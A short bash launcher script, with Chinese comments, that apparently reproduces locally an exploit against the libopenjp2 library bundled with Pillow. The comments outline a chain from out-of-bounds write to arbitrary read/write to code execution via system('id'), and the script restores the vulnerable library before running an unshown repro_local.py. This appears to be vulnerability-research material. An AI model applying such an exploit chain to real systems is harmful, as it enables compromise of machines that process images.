#!/usr/bin/env bash
# 本地复现脚本（NOT a remote exploit）
#   OOB 越界写 -> 嫁接 memoryview -> 任意读写 -> 本地 RCE（system("id")）
set -u
D=$(cd "$(dirname "$0")" && pwd)
cd "$D" || exit 1

PD=/usr/local/lib/python3.12/dist-packages/pillow.libs/libopenjp2-0ec72a70.so.2.5.4
[ -f "${PD}.orig" ] && cp "${PD}.orig" "$PD"     # 确保使用官方(含洞)版本

echo "[*] dir   : $D"
echo "[*] lib   : $PD"
timeout 600 python3 -u repro_local.py